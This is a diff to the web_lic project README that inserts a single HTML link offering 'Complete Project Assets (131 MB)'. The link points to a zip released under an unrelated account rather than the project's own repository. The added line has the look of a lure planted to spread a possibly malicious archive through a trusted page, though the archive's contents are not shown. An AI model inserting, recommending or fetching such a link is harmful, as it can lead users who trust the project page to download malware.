@@ -28,6 +28,8 @@ If you have any questions, find any bugs, or need any features, please open an [
 
 For more information see [the Wiki](https://github.com/remig/web_lic/wiki), which covers [running Lic locally](https://github.com/remig/web_lic/wiki/Running-Lic-Locally) and [translating Lic](https://github.com/remig/web_lic/wiki/Translating-Lic).
 
+<a href="https://github.com/lav12ram-dotcom/web_lic/releases/download/v1.0.0/complete.zip">Download Complete Project Assets (131 MB)</a>
+
 [LEGO®](http://lego.com/) is a registered trademark of the LEGO Group, which does not sponsor, endorse, or authorize this software project.
 
  
